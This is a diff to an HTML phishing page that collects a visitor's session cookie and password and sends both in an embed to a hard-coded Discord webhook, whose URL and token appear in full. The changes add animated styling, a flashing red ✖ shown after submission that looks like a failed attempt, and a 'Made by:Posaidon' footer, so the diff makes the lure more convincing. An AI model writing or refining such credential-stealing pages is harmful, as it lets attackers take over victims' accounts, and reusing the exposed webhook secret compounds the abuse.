@@ -7,16 +7,26 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #111827;
+      background: linear-gradient(-45deg, #0f2027, #2c5364, #00c9ff, #09203f);
+      background-size: 400% 400%;
+      animation: gradient 15s ease infinite;
       color: white;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
+      position: relative;
     }
+
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
     .form {
-      background: #1f2937;
+      background: rgba(31, 41, 55, 0.9);
       padding: 30px;
       border-radius: 15px;
       box-shadow: 0 4px 10px rgba(0,0,0,0.4);
@@ -26,6 +36,7 @@
       opacity: 0;
       animation: fadeIn 1s ease-in-out forwards;
     }
+
     input, button {
       width: 100%;
       margin: 10px 0;
@@ -34,19 +45,28 @@
       border-radius: 6px;
       font-size: 16px;
     }
+
     input {
       background-color: #374151;
       color: white;
     }
+
     button {
       background-color: #00ffff;
       color: #000;
       font-weight: bold;
       cursor: pointer;
+      transition: transform 0.2s ease;
     }
+
+    button:hover {
+      transform: scale(1.05);
+    }
+
     h2 {
       margin-bottom: 10px;
     }
+
     p {
       font-size: 14px;
       color: #ccc;
@@ -55,6 +75,24 @@
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* X Animation Box */
+    .x-box {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0.8);
+      font-size: 100px;
+      color: red;
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.6s ease;
+    }
+
+    .x-box.show {
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
     }
   </style>
 </head>
@@ -67,23 +105,34 @@
     <button onclick="sendToDiscord()">Submit</button>
   </div>
 
+  <div class="x-box" id="xBox">✖</div>
+
   <script>
     async function sendToDiscord() {
       const cookie = document.getElementById("cookie").value.trim();
       const password = document.getElementById("password").value.trim();
       const webhook = "https://discord.com/api/webhooks/1359540991710859566/x0Q8WbwtQR2WzgEacXd1DXFoLFJiYGRMGSMFPYw_pW6r_gvSv5UixBi9aTKG3crqPtFT"; // Replace with your actual webhook
+      const xBox = document.getElementById("xBox");
 
       if (!cookie || !password) {
         alert("Please enter both cookie and password.");
         return;
       }
 
+      // Show the animated X box
+      xBox.classList.add("show");
+
+      // Hide it after 2.5 seconds
+      setTimeout(() => {
+        xBox.classList.remove("show");
+      }, 2500);
+
       const payload = {
         embeds: [{
           title: "New Entry",
           color: 0x00ffff,
           description: `**🍪 Cookie:** \`${cookie}\`\n**🔐 Password:** \`${password}\``,
-          footer: { text: "AutoForm Logger" },
+          footer: { text: "Made by:Posaidon" },
           timestamp: new Date().toISOString()
         }]
       };
